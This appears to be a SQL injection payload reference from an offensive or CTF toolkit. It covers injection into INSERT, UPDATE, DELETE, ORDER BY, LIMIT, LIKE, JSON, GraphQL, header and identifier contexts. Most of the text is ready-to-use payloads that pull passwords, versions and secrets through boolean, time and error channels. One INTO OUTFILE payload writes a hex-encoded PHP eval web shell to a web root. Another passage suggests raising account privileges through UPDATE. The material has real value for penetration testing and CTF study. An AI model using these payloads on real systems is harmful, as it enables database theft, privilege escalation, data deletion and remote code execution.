# Edge injection contexts — INSERT/UPDATE/DELETE, ORDER BY, LIMIT,
# LIKE, headers, JSON, multipart

`UNION SELECT` only lives inside a SELECT list. Everything below is
the grammar that applies everywhere else — the places where "no
UNION works" is a clue you are inside a different statement, not
that there is no injection.

Rule for all of them: figure out the WRAPPING statement first —
probe `'`, `')`, `"))`, `,`, `;` and watch which close cleanly.

---

## 1. INSERT INTO ... VALUES(v1, v2, %s)

Grammar shape: `INSERT INTO t(a,b,c) VALUES(?,?,?)`. Your value sits
inside the parenthesised tuple. UNION cannot attach — the grammar
forbids — but the tuple accepts arbitrary expressions including
subselects:

```sql
-- your value is the 2nd of 3: 'x',(subquery),'y' style
x',(SELECT password FROM users LIMIT 1),'y')-- -
x',(SELECT @@version),'y')-- -
x',(SELECT user()),'x')-- -

-- if only ONE value slot is yours:
x',(SELECT password FROM users LIMIT 1))-- -        -- close the tuple
x,(SELECT password FROM users LIMIT 1),'y')-- -
x',(SELECT sleep(5)),'y')-- -                        -- time channel
x',IF(cond,(SELECT secret FROM t),0),'y')-- -        -- conditional

-- multi-row INSERT (VALUES (...),(...)) — open a second tuple:
x'),('y',(SELECT password FROM users LIMIT 1),'z')-- -
```

Extraction channels inside INSERT:

- The inserted value often shows up LATER (profile page, admin
  panel, "welcome user") — the classic second-order path:
  `name = x',(SELECT flag FROM secrets LIMIT 1),'y` gets stored
  where you can read it. That IS the extraction — no blind loop.
- If nothing renders back: error-based still works —
  `',extractvalue(1,concat(0x7e,version())),'x')-- -` errors the
  INSERT loudly.
- Time: `',(SELECT SLEEP(3)),'x')-- -`.
- Number context: `1,(SELECT flag FROM secrets),3)-- -` — the
  integer column renders the flag when read back as its numeric
  value, or leaks it in the duplicate-key error:
  `Duplicate entry '42' for key 'PRIMARY'` → `'flagvalue'` appears
  in that error for non-unique columns.

The famous MySQL trick — ON DUPLICATE KEY UPDATE:

```sql
x','x','x') ON DUPLICATE KEY UPDATE col=(SELECT password FROM
   users LIMIT 1)-- -
```

If the INSERT has that clause after your value, you may already be
inside it — `'), ON DUPLICATE KEY` often needs the paren closed:

```sql
x') ON DUPLICATE KEY UPDATE col=VALUES(col)+1-- -
```

Auto_increment / duplicate-id error channels:

```sql
x' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),
   FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a),'y')-- -
   -- dup-entry works inside VALUES too
```

---

## 2. UPDATE t SET a=%s WHERE ...

Value inside SET clause:

```sql
x',b=(SELECT password FROM users LIMIT 1) WHERE id=1-- -
x'=(SELECT secret),b='y' WHERE id=1-- -
x',b=sleep(3) WHERE id=1-- -                          -- time
```

Or inside the WHERE:

```sql
x' AND (SELECT 1 FROM dual WHERE cond)=1-- -           -- boolean
x' AND IF(cond,sleep(3),0)-- -                          -- time
```

Column names (when YOU control a SET column name — rare but real):

```sql
a`=(SELECT password FROM users LIMIT 1),b`='x   -- backtick close
```

---

## 3. DELETE FROM t WHERE %s

Same as WHERE injection — but the blast radius is deleting rows.
Use only read-only probes until you can scope it:

```sql
x' AND 1=1-- -                -- true = ALL rows may be affected — careful
x' AND 1=2-- -                -- false = none — safe probe
x' AND id=999999 AND sleep(3)-- -                     -- time via count
```

READ the request semantics: DELETE endpoints often fire
`DELETE ... WHERE id=%s` — a boolean-true payload deletes everything.
Probe `AND 1=2` FIRST always in DELETE contexts.

---

## 4. ORDER BY injection — expression sort contexts

`ORDER BY %s` — you control the sort expression. UNION can't attach
(ORDER BY comes after the query) but arbitrary expressions including
subqueries sort the rows:

```sql
sort=if(1=1,id,name)                              -- MySQL
sort=if(ascii(substring(database(),1,1))>100,id,name)
sort=(case when (1=1) then id else name end)      -- PG/MSSQL/Oracle
sort=(select case when cond then name else id end
      from users limit 1)
sort=(select sleep(3))                            -- time check
sort=id,if(cond,sleep(3),name)                    -- pair trick
sort=(select if(cond,name,password) from users limit 1)
sort=rand(cond)                                   -- random ordering
```

The signal IS the row order: if `sort=if(cond,a,b)` flips the
displayed order between `cond=true`/`cond=false`, the oracle is
boolean — extract via first-vs-second row:

```sql
sort=if(ascii(substring((select flag from secrets limit 1),1,1))
        >100, username, email)
-- if 'alice' renders first when true, 'zeta@x' first when false
```

Probing whether ORDER BY injection exists at all — send expressions
that reorder deterministically:

```text
sort=id                  vs   sort=id desc        — order flips?
sort=3                   vs   sort=1              — col-index sort
sort=if(1=1,id,name)     vs   sort=if(1=2,id,name)
sort=rand(1)             vs   sort=rand(0)
sort=(select 1)          — usually no reorder; errors? still probe
```

When expressions are filtered to a whitelist of column names —
often only `asc`/`desc` suffix is injectable:

```text
sort=id,username                                    -- multi-key sort
sort=id desc-- -                                    -- inject after
sort=id desc,if(cond,id,name)                      -- expression list
```

MSSQL ORDER BY specifics — `CASE` and subqueries:

```sql
sort=(SELECT CASE WHEN (1=1) THEN name ELSE id END)
sort=(SELECT TOP 1 CASE WHEN cond THEN 'a' ELSE 'b' END
      FROM users)
```

Oracle:

```sql
sort=DECODE(cond,'a','b')
sort=(SELECT CASE WHEN cond THEN 1 ELSE 0 END FROM dual)
```

The ORDER BY → time bridge when rows don't reorder visibly:

```sql
sort=if(cond,sleep(3),id)
sort=(select if(cond,sleep(3),id))
sort=id,if(cond,sleep(3),0)      -- second sort key sleeps
```

### PostgreSQL ORDER BY + stacked trick (the famous error probe)

```sql
sort=1,(SELECT CASE WHEN (cond) THEN
   cast(current_database() as int) ELSE 0 END)-- -
```

### The ORDER BY → read trick on MySQL

```sql
sort=procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)
-- PROCEDURE ANALYSE() still parses on < 8.0 — error echo variant
```

---

## 5. LIMIT / OFFSET / GROUP BY

`LIMIT n,%s` or `LIMIT %s` — you control the row count:

```sql
-- MySQL: LIMIT takes expressions in some versions
10,1 PROCEDURE analyse(extractvalue(1,concat(0x7e,version())),1)-- -
   -- the PROCEDURE trick lives inside LIMIT args
1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,
   (select mid((select password from users limit 1),1,20))))),1)-- -

-- PG: LIMIT is strict int — expression forms fail; UNION via
-- stacked ';' is the path
```

`GROUP BY %s` — same expression surface as ORDER BY:

```sql
groupby=if(cond,a,b)
groupby=(select case when cond then 1 else 0 end)
```

`INTO OUTFILE`/`INTO DUMPFILE` live at end-of-SELECT — when you can
append after LIMIT:

```sql
' LIMIT 0,1 INTO OUTFILE '/var/www/html/s.php'
   LINES TERMINATED BY 0x3c3f706870206564616c28245f4745545b63635d293b203f3e
   -- -     -- hex payload as terminator writes the shell bytes
```

---

## 6. LIKE / wildcard contexts

`WHERE name LIKE '%s%'` — your value sits inside the LIKE string:
escape the `%`/`_` wildcards yourself or your probe matches
everything:

```sql
a%' AND '1'='1        -- escape the leading % by closing the string
a%_' AND '1'='1       -- %_ still wildcard-safe
a\' AND '1'='1        -- backslash-escape the quote? no — quote closes
x%') AND ('1'='1
%','%') AND 1=1-- -   -- value ends: 'x%','%') pattern
```

Different shape — the value is a LIKE PATTERN itself (`?q=a%`):
`%` and `_` are YOUR wildcards — `a%` matches all a-words. Use them
as free substring matching:

```text
q=a%         →  matches 'admin','anyone' — loose match probe
q=%25        →  literal '%' escaped as %25 in URL — match everything
q=_dmin      →  single-char wildcard probing names blind
```

---

## 7. JOIN / SET / VALUES / CALL / DO

```sql
-- JOIN ON clause (rare but real in search joins):
x' ON 1=1-- -
x') ON (1=1-- -

-- SET clause multi-value:
x',a=(SELECT @@version),b='y

-- CALL (proc invocation):
x'); CALL proc((SELECT password FROM users LIMIT 1))-- -

-- DO statements:
x'; DO SLEEP(5)-- -
```

---

## 8. JSON body / GraphQL params

Same SQLi, different envelope — the payload content is unchanged,
the framing differs:

```json
{"id":"1' AND '1'='1-- -"}
{"id":"1' AND '1'='2-- -"}
{"id":"1 AND 1=1"}
{"id":{"$ne":""}}                          -- nosql shape, other skill
{"search":"a%' UNION SELECT NULL-- -"}
{"sort":"id,if(1=1,id,name)"}
{"ids":["1","2' AND 1=1-- -"]}
{"filter[where][id]":"1' AND '1'='1-- -"}  -- loopback-style objects
```

Escapes inside JSON strings:

```json
{"q":"a\u0027 UNION SELECT NULL-- -"}     -- \u escape → quote
{"q":"a\\' UNION SELECT NULL-- -"}         -- \\ → literal backslash+'
{"q":"a' UNION SELECT NULL-- -"}
```

GraphQL:

```graphql
{ user(id:"1' AND '1'='1-- -") { name } }
{ user(id:"1' UNION SELECT NULL,username-- -") { name } }
query ($id:ID!){ node(id:$id){...} }
   variables {"id":"1' AND '1'='1-- -"}
```

Strings inside GraphQL are JSON-escaped — `\u0027` same as JSON.

---

## 9. Header / cookie / filename contexts

Values that reach SQL without touching the query string:

```text
X-Forwarded-For: 127.0.0.1' AND '1'='1-- -        -- IP loggers
Referer: https://x' AND SLEEP(3)-- -
User-Agent: x' OR '1'='1-- -                      -- UA analytics table
Cookie: session=abc' UNION SELECT NULL-- -
Cookie: prefs=id' AND 1=1-- -
Content-Disposition: filename="x' UNION SELECT NULL-- -.jpg"
                                              -- upload-metadata sinks
Content-Type: multipart/form-data; boundary=x'--
X-Api-Key: key' OR '1'='1-- -
```

Detection is the same pairs; the transport is the header value —
`tools/web/http_probe.py --header 'X-Forwarded-For'` style call.

---

## 10. Column-name / identifier injection (DDL fragments)

When the app interpolates identifiers not values — sort keys, group
columns, table names in dynamic SQL:

```sql
-- backtick-close on MySQL:
sort=x` from users union select password-- -
sort=x` ,`y`=(select password from users limit 1)-- -

-- bracket-close on MSSQL:
sort=[x] ,1=(select convert(int,@@version))-- -

-- quoted identifier on PG/Oracle/SQLite:
sort="x" from users-- -
```

---

## 11. Second-order within edge contexts

INSERT/UPDATE contexts are exactly where stored SQLi lives — the
payload renders when the admin page / report / export reads it:

```text
register user  = x',(SELECT @@version),'y'      -> admin user-list shows it
comment text   = '||(SELECT password FROM users LIMIT 1)||'
file name      = shell' UNION SELECT ...-- -.php  -> media listing
email field    = a' OR '1'='1'@x.com
billing addr   = x' OR updatexml(1,concat(0x7e,user()),1)-- -
```

`second-order.md` covers the trigger-and-read loop.

---

## 12. When NOTHING renders — chain to write

Some edge contexts only write (INSERT-only forms). Then the channel
isn't extraction at all — it's the written side-effect:

- Write a marker that changes another page (a stored comment that
  breaks a later query — SQLi inside SQLi).
- `INTO OUTFILE` inside a stacked INSERT writes the shell to disk —
  check `mysql.md` §7, `postgresql.md` §9 for the syntax.
- An UPDATE that flips a privilege column on YOUR OWN account is
  often the actual CTF goal — look for `role`/`admin` columns in
  the schema first.

---

## 13. The dispatch table — context → channel

| Wrapper | UNION? | Blind | Error | Time | Write | Note |
|---|---|---|---|---|---|---|
| SELECT list | ✓ | ✓ | ✓ | ✓ | — | the standard case |
| WHERE | ✓ | ✓ | ✓ | ✓ | — | standard |
| ORDER/GROUP BY | ✗ | ✓ via row order | ✓ | ✓ | — | sort as oracle |
| LIMIT arg | ~ | ✓ | ✓ via PROCEDURE | ✓ | OUTFILE trick | MySQL |
| INSERT VALUES | ✗ | via readback | ✓ | ✓ | direct | second-order home |
| UPDATE SET | ✗ | ✓ | ✓ | ✓ | direct | |
| UPDATE/DELETE WHERE | ✗ | ✓ | ✓ | ✓ | destructive probe order | `AND 1=2` first |
| JOIN ON | ✗ | ✓ | ✓ | ✓ | — | |
| LIKE pattern | ✗ | ✓ | ✓ | ✓ | — | escape % _ |
| column name | via backtick/bracket | — | ✓ | — | — | identifier injection |
| header/cookie | context-dependent | ✓ | ✓ | ✓ | — | transport differs |
| JSON value | ✓ | ✓ | ✓ | ✓ | — | escape rules differ |
